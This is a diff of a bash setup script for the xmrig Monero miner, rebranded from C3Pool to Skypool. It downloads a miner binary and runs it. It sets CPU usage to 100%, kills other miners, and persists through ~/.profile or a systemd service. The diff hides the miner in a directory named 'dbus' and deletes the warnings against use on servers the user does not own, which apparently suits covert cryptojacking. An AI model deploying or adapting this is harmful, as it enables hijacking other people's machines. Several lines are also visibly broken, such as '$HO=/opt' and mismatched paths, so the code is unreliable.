@@ -1,29 +1,25 @@
 #!/bin/bash
 
-VERSION=2.11
-HO=/tmp
+VERSION=0.1
+$HO=/opt
+
 # printing greetings
 
-echo "C3Pool mining setup script v$VERSION."
-echo "警告: 请勿将此脚本使用在非法用途,如有发现在非自己所有权的服务器内使用该脚本"
-echo "我们将在接到举报后,封禁违法的钱包地址,并将有关信息收集并提交给警方"
-echo "(please report issues to support@c3pool.com email with full output of this script with extra \"-x\" \"bash\" option)"
+echo "Skypool mining setup script v$VERSION."
 echo
 
 if [ "$(id -u)" == "0" ]; then
   echo "WARNING: Generally it is not adviced to run this script under root"
-  echo "警告: 不建议在root用户下使用此脚本"
 fi
 
 # command line arguments
 WALLET=$1
-EMAIL=$2 # this one is optional
 
 # checking prerequisites
 
 if [ -z $WALLET ]; then
   echo "Script usage:"
-  echo "> setup_c3pool_miner.sh <wallet address> [<your email address>]"
+  echo "> setup_skypool_miner.sh <wallet address>"
   echo "ERROR: Please specify your wallet address"
   exit 1
 fi
@@ -34,13 +30,13 @@ if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 ]; then
   exit 1
 fi
 
-if [ -z $HO ]; then
+if [ -z $HOME ]; then
   echo "ERROR: Please define HOME environment variable to your home directory"
   exit 1
 fi
 
-if [ ! -d $HO ]; then
-  echo "ERROR: Please make sure HOME directory $HO exists or set it yourself using this command:"
+if [ ! -d $HOME ]; then
+  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
   echo '  export HOME=<dir>'
   exit 1
 fi
@@ -63,83 +59,90 @@ fi
 
 # calculating port
 
-CPU_THREADS=$(nproc)
-EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
+LSCPU=`lscpu`
+CPU_SOCKETS=`echo "$LSCPU" | grep "^Socket(s):" | cut -d':' -f2 | sed "s/^[ \t]*//"`
+if [ -z $CPU_SOCKETS ]; then
+  echo "WARNING: Can't get CPU sockets from lscpu output"
+  export CPU_SOCKETS=1
+fi
+CPU_CORES_PER_SOCKET=`echo "$LSCPU" | grep "^Core(s) per socket:" | cut -d':' -f2 | sed "s/^[ \t]*//"`
+if [ -z "$CPU_CORES_PER_SOCKET" ]; then
+  echo "WARNING: Can't get CPU cores per socket from lscpu output"
+  export CPU_CORES_PER_SOCKET=1
+fi
+CPU_THREADS=`echo "$LSCPU" | grep "^CPU(s):" | cut -d':' -f2 | sed "s/^[ \t]*//"`
+if [ -z "$CPU_THREADS" ]; then
+  echo "WARNING: Can't get CPU cores from lscpu output"
+  if ! type nproc >/dev/null; then
+    echo "WARNING: This script requires \"nproc\" utility to work correctly"
+    export CPU_THREADS=1
+  else
+    CPU_THREADS=`nproc`
+    if [ -z "$CPU_THREADS" ]; then
+      echo "WARNING: Can't get CPU cores from nproc output"
+      export CPU_THREADS=1
+    fi
+  fi
+fi
+CPU_MHZ=`echo "$LSCPU" | grep "^CPU MHz:" | cut -d':' -f2 | sed "s/^[ \t]*//"`
+CPU_MHZ=${CPU_MHZ%.*}
+if [ -z "$CPU_MHZ" ]; then
+  echo "WARNING: Can't get CPU MHz from lscpu output"
+  export CPU_MHZ=1000
+fi
+CPU_L1_CACHE=`echo "$LSCPU" | grep "^L1d" | cut -d':' -f2 | sed "s/^[ \t]*//" | sed "s/ \?K\(iB\)\?\$//"`
+if echo "$CPU_L1_CACHE" | grep MiB >/dev/null; then
+  CPU_L1_CACHE=`echo "$CPU_L1_CACHE" | sed "s/ MiB\$//"`
+  CPU_L1_CACHE=$(( $CPU_L1_CACHE * 1024))
+fi
+if [ -z "$CPU_L1_CACHE" ]; then
+  echo "WARNING: Can't get L1 CPU cache from lscpu output"
+  export CPU_L1_CACHE=16
+fi
+CPU_L2_CACHE=`echo "$LSCPU" | grep "^L2" | cut -d':' -f2 | sed "s/^[ \t]*//" | sed "s/ \?K\(iB\)\?\$//"`
+if echo "$CPU_L2_CACHE" | grep MiB >/dev/null; then
+  CPU_L2_CACHE=`echo "$CPU_L2_CACHE" | sed "s/ MiB\$//"`
+  CPU_L2_CACHE=$(( $CPU_L2_CACHE * 1024))
+fi
+if [ -z "$CPU_L2_CACHE" ]; then
+  echo "WARNING: Can't get L2 CPU cache from lscpu output"
+  export CPU_L2_CACHE=256
+fi
+CPU_L3_CACHE=`echo "$LSCPU" | grep "^L3" | cut -d':' -f2 | sed "s/^[ \t]*//" | sed "s/ \?K\(iB\)\?\$//"`
+if echo "$CPU_L3_CACHE" | grep MiB >/dev/null; then
+  CPU_L3_CACHE=`echo "$CPU_L3_CACHE" | sed "s/ MiB\$//"`
+  CPU_L3_CACHE=$(( $CPU_L3_CACHE * 1024))
+fi
+if [ -z "$CPU_L3_CACHE" ]; then
+  echo "WARNING: Can't get L3 CPU cache from lscpu output"
+  export CPU_L3_CACHE=2048
+fi
+
+TOTAL_CACHE=$(( $CPU_THREADS*$CPU_L1_CACHE + $CPU_SOCKETS * ($CPU_CORES_PER_SOCKET*$CPU_L2_CACHE + $CPU_L3_CACHE)))
+if [ -z $TOTAL_CACHE ]; then
+  echo "ERROR: Can't compute total cache"
+  exit 1
+fi
+EXP_MONERO_HASHRATE=$(( ($CPU_THREADS < $TOTAL_CACHE / 2048 ? $CPU_THREADS : $TOTAL_CACHE / 2048) * ($CPU_MHZ * 20 / 1000) * 5 ))
 if [ -z $EXP_MONERO_HASHRATE ]; then
   echo "ERROR: Can't compute projected Monero CN hashrate"
   exit 1
 fi
 
-power2() {
-  if ! type bc >/dev/null; then
-    if   [ "$1" -gt "0" ]; then
-      echo "0"
-    elif [ "$1" -gt "0" ]; then
-      echo "0"
-    elif [ "$1" -gt "0" ]; then
-      echo "0"
-    elif [ "$1" -gt "0" ]; then
-      echo "0"
-    elif [ "$1" -gt "0" ]; then
-      echo "0"
-    elif [ "$1" -gt "0" ]; then
-      echo "0"
-    elif [ "$1" -gt "0" ]; then
-      echo "0"
-    elif [ "$1" -gt "0" ]; then
-      echo "0"
-    elif [ "$1" -gt "0" ]; then
-      echo "0"
-    elif [ "$1" -gt "0" ]; then
-      echo "0"
-    elif [ "$1" -gt "0" ]; then
-      echo "0"
-    elif [ "$1" -gt "0" ]; then
-      echo "0"
-    elif [ "$1" -gt "0" ]; then
-      echo "0"
-    else
-      echo "1"
-    fi
-  else 
-    echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l;
-  fi
-}
-
-PORT=$(( $EXP_MONERO_HASHRATE * 30 ))
-PORT=$(( $PORT == 0 ? 1 : $PORT ))
-PORT=`power2 $PORT`
-PORT=$(( 19999 ))
-if [ -z $PORT ]; then
-  echo "ERROR: Can't compute port"
-  exit 1
-fi
-
-if [ "$PORT" -lt "19999" -o "$PORT" -gt "19999" ]; then
-  echo "ERROR: Wrong computed port value: $PORT"
-  exit 1
-fi
+PORT=6666
 
 
 # printing intentions
 
 echo "I will download, setup and run in background Monero CPU miner."
-echo "将进行下载设置,并在后台中运行xmrig矿工."
 echo "If needed, miner in foreground can be started by $HO/dbus/miner.sh script."
-echo "如果需要,可以通过以下方法启动前台矿工输出 $HO/dbus/miner.sh script."
 echo "Mining will happen to $WALLET wallet."
-echo "将使用 $WALLET 地址进行开采"
-if [ ! -z $EMAIL ]; then
-  echo "(and $EMAIL email as password to modify wallet options later at https://c3pool.com site)"
-fi
 echo
 
 if ! sudo -n true 2>/dev/null; then
-  echo "Since I can't do passwordless sudo, mining in background will started from your $HO/.profile file first time you login this host after reboot."
-  echo "由于脚本无法执行无密码的sudo，因此在您重启后首次登录此主机时，后台开采将从您的 $HO/.profile 文件开始."
+  echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
 else
-  echo "Mining in background will be performed using c3pool_miner systemd service."
-  echo "后台开采将使用c3pool_miner systemd服务执行."
+  echo "Mining in background will be performed using skypool_miner systemd service."
 fi
 
 echo
@@ -147,93 +150,74 @@ echo "JFYI: This host has $CPU_THREADS CPU threads with $CPU_MHZ MHz and ${TOTAL
 echo
 
 echo "Sleeping for 15 seconds before continuing (press Ctrl+C to cancel)"
-echo "等待 15 秒将继续运行安装 (按 Ctrl+C 取消)"
 sleep 15
 echo
 echo
 
 # start doing stuff: preparing miner
 
-echo "[*] Removing previous c3pool miner (if any)"
-echo "[*] 卸载以前的 C3Pool 矿工 (如果存在)"
+echo "[*] Removing previous skypool miner (if any)"
 if sudo -n true 2>/dev/null; then
-  sudo systemctl stop c3pool_miner.service
+  sudo systemctl stop skypool_miner.service
 fi
 killall -9 xmrig
 
-echo "[*] Removing $HO/c3pool directory"
-rm -rf /root/c3pool
+echo "[*] Removing $HO/dbus directory"
+rm -rf $HO/dbus
 
-echo "[*] Downloading C3Pool advanced version of xmrig to /dbus/xmrig.tar.gz"
-echo "[*] 下载 C3Pool 版本的 Xmrig 到 /tmp/xmrig.tar.gz 中"
-if ! curl -L --progress-bar "http://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
-  echo "ERROR: Can't download http://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
-  echo "发生错误: 无法下载 http://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz 文件到 /tmp/xmrig.tar.gz"
+if ! curl -L --progress-bar "https://raw.githubusercontent.com/skypool-org/xmrig_setup/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
+  echo "ERROR: Can't download https://raw.githubusercontent.com/skypool-org/xmrig_setup/master/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
   exit 1
 fi
 
-echo "[*] Unpacking /tmp/xmrig.tar.gz to $HO/c3pool"
-echo "[*] 解压 /tmp/xmrig.tar.gz 到 $HO/c3pool"
+echo "[*] Unpacking /tmp/xmrig.tar.gz to $HO/dbus"
 [ -d $HO/dbus ] || mkdir $HO/dbus
 if ! tar xf /tmp/xmrig.tar.gz -C $HO/dbus; then
-  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HO/c3pool directory"
-  echo "发生错误: 无法解压 /tmp/xmrig.tar.gz 到 $HO/c3pool 目录"
+  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HO/dbus directory"
   exit 1
 fi
 rm /tmp/xmrig.tar.gz
 
 echo "[*] Checking if advanced version of $HO/dbus/xmrig works fine (and not removed by antivirus software)"
-echo "[*] 检查目录 $HO/dbus/xmrig 中的xmrig是否运行正常 (或者是否被杀毒软件误杀)"
-sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HO/dbus/config.json
+sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HO/dbus/config.json
 $HO/dbus/xmrig --help >/dev/null
 if (test $? -ne 0); then
   if [ -f $HO/dbus/xmrig ]; then
     echo "WARNING: Advanced version of $HO/dbus/xmrig is not functional"
-	echo "警告: 版本 $HO/dbus/xmrig 无法正常工作"
   else 
     echo "WARNING: Advanced version of $HO/dbus/xmrig was removed by antivirus (or some other problem)"
-	echo "警告: 该目录 $HO/dbus/xmrig 下的xmrig已被杀毒软件删除 (或其它问题)"
   fi
 
   echo "[*] Looking for the latest version of Monero miner"
-  echo "[*] 查看最新版本的 xmrig 挖矿工具"
   LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
   LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`
 
   echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/xmrig.tar.gz"
-  echo "[*] 下载 $LATEST_XMRIG_LINUX_RELEASE 到 /tmp/xmrig.tar.gz"
   if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then
     echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz"
-	echo "发生错误: 无法下载 $LATEST_XMRIG_LINUX_RELEASE 文件到 /tmp/xmrig.tar.gz"
     exit 1
   fi
 
-  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HO/c3pool"
-  echo "[*] 解压 /tmp/xmrig.tar.gz 到 $HO/c3pool"
+  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HO/dbus"
   if ! tar xf /tmp/xmrig.tar.gz -C $HO/dbus --strip=1; then
-    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HO/c3pool directory"
-	echo "警告: 无法解压 /tmp/xmrig.tar.gz 到 $HO/c3pool 目录下"
+    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HO/dbus directory"
   fi
   rm /tmp/xmrig.tar.gz
 
   echo "[*] Checking if stock version of $HO/dbus/xmrig works fine (and not removed by antivirus software)"
-  echo "[*] 检查目录 $HO/dbus/xmrig 中的xmrig是否运行正常 (或者是否被杀毒软件误杀)"
   sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HO/dbus/config.json
   $HO/dbus/xmrig --help >/dev/null
   if (test $? -ne 0); then 
     if [ -f $HO/dbus/xmrig ]; then
       echo "ERROR: Stock version of $HO/dbus/xmrig is not functional too"
-	  echo "发生错误: 该目录中的 $HO/dbus/xmrig 也无法使用"
     else 
       echo "ERROR: Stock version of $HO/dbus/xmrig was removed by antivirus too"
-	  echo "发生错误: 该目录中的 $HO/dbus/xmrig 已被杀毒软件删除"
     fi
     exit 1
   fi
 fi
 
 echo "[*] Miner $HO/dbus/xmrig is OK"
-echo "[*] 矿工 $HO/dbus/xmrig 运行正常"
 
 PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
 if [ "$PASS" == "localhost" ]; then
@@ -242,11 +226,8 @@ fi
 if [ -z $PASS ]; then
   PASS=na
 fi
-if [ ! -z $EMAIL ]; then
-  PASS="$PASS:$EMAIL"
-fi
 
-sed -i 's/"url": *"[^"]*",/"url": "auto.c3pool.org:'$PORT'",/' $HO/dbus/config.json
+sed -i 's/"url": *"[^"]*",/"url": "auto.skypool.xyz:'$PORT'",/' $HO/dbus/config.json
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HO/dbus/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HO/dbus/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HO/dbus/config.json
@@ -259,7 +240,6 @@ sed -i 's/"background": *false,/"background": true,/' $HO/dbus/config_background
 # preparing script
 
 echo "[*] Creating $HO/dbus/miner.sh script"
-echo "[*] 在该目录下创建 $HO/dbus/miner.sh 脚本"
 cat >$HO/dbus/miner.sh <<EOL
 #!/bin/bash
 if ! pidof xmrig >/dev/null; then
@@ -267,8 +247,6 @@ if ! pidof xmrig >/dev/null; then
 else
   echo "Monero miner is already running in the background. Refusing to run another one."
   echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove background miner first."
-  echo "门罗币矿工已经在后台运行。 拒绝运行另一个."
-  echo "如果要先删除后台矿工，请运行 \"killall xmrig\" 或 \"sudo killall xmrig\"."
 fi
 EOL
 
@@ -277,22 +255,18 @@ chmod +x $HO/dbus/miner.sh
 # preparing script background work and work under reboot
 
 if ! sudo -n true 2>/dev/null; then
-  if ! grep dbus/miner.sh $HO/.profile >/dev/null; then
-    echo "[*] Adding $HO/dbus/miner.sh script to $HO/.profile"
-	echo "[*] 添加 $HO/dbus/miner.sh 到 $HO/.profile"
+  if ! grep skypool/miner.sh $HOME/.profile >/dev/null; then
+    echo "[*] Adding $HO/dbus/miner.sh script to $HOME/.profile"
     echo "$HO/dbus/miner.sh --config=$HO/dbus/config_background.json >/dev/null 2>&1" >>$HOME/.profile
   else 
-    echo "Looks like $HO/dbus/miner.sh script is already in the $HO/.profile"
-	echo "脚本 $HO/dbus/miner.sh 已存在于 $HO/.profile 中."
+    echo "Looks like $HO/dbus/miner.sh script is already in the $HOME/.profile"
   fi
   echo "[*] Running miner in the background (see logs in $HO/dbus/xmrig.log file)"
-  echo "[*] 已在后台运行xmrig矿工 (请查看 $HO/dbus/xmrig.log 日志文件)"
   /bin/bash $HO/dbus/miner.sh --config=$HO/dbus/config_background.json >/dev/null 2>&1
 else
 
-  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
+  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
     echo "[*] Enabling huge pages"
-	echo "[*] 启用 huge pages"
     echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
     sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
   fi
@@ -300,15 +274,14 @@ else
   if ! type systemctl >/dev/null; then
 
     echo "[*] Running miner in the background (see logs in $HO/dbus/xmrig.log file)"
-	echo "[*] 已在后台运行xmrig矿工 (请查看 $HO/dbus/xmrig.log 日志文件)"
     /bin/bash $HO/dbus/miner.sh --config=$HO/dbus/config_background.json >/dev/null 2>&1
     echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
     echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
 
   else
 
-    echo "[*] Creating c3pool_miner systemd service"
-    cat >/tmp/c3pool_miner.service <<EOL
+    echo "[*] Creating skypool_miner systemd service"
+    cat >/tmp/skypool_miner.service <<EOL
 [Unit]
 Description=Monero miner service
 
@@ -321,21 +294,18 @@ CPUWeight=1
 [Install]
 WantedBy=multi-user.target
 EOL
-    sudo mv /tmp/c3pool_miner.service /etc/systemd/system/c3pool_miner.service
-    echo "[*] Starting c3pool_miner systemd service"
-	echo "[*] 启动c3pool_miner systemd服务"
+    sudo mv /tmp/skypool_miner.service /etc/systemd/system/skypool_miner.service
+    echo "[*] Starting skypool_miner systemd service"
     sudo killall xmrig 2>/dev/null
     sudo systemctl daemon-reload
-    sudo systemctl enable c3pool_miner.service
-    sudo systemctl start c3pool_miner.service
-    echo "To see miner service logs run \"sudo journalctl -u c3pool_miner -f\" command"
-	echo "查看矿工服务日志,请运行 \"sudo journalctl -u c3pool_miner -f\" 命令"
+    sudo systemctl enable skypool_miner.service
+    sudo systemctl start skypool_miner.service
+    echo "To see miner service logs run \"sudo journalctl -u skypool_miner -f\" command"
   fi
 fi
 
 echo ""
 echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
-echo "提示: 如果您使用共享VPS，建议避免由矿工产生100％的CPU使用率，否则可能将被禁止使用"
 if [ "$CPU_THREADS" -lt "4" ]; then
   echo "HINT: Please execute these or similair commands under root to limit miner to 75% percent CPU usage:"
   echo "sudo apt-get update; sudo apt-get install -y cpulimit"
@@ -353,6 +323,3 @@ fi
 echo ""
 
 echo "[*] Setup complete"
-echo "[*] 安装完成"
-echo "警告: 请勿将此脚本使用在非法用途,如有发现在非自己所有权的服务器内使用该脚本"
-echo "我们将在接到举报后,封禁违法的钱包地址,并将有关信息收集并提交给警方"
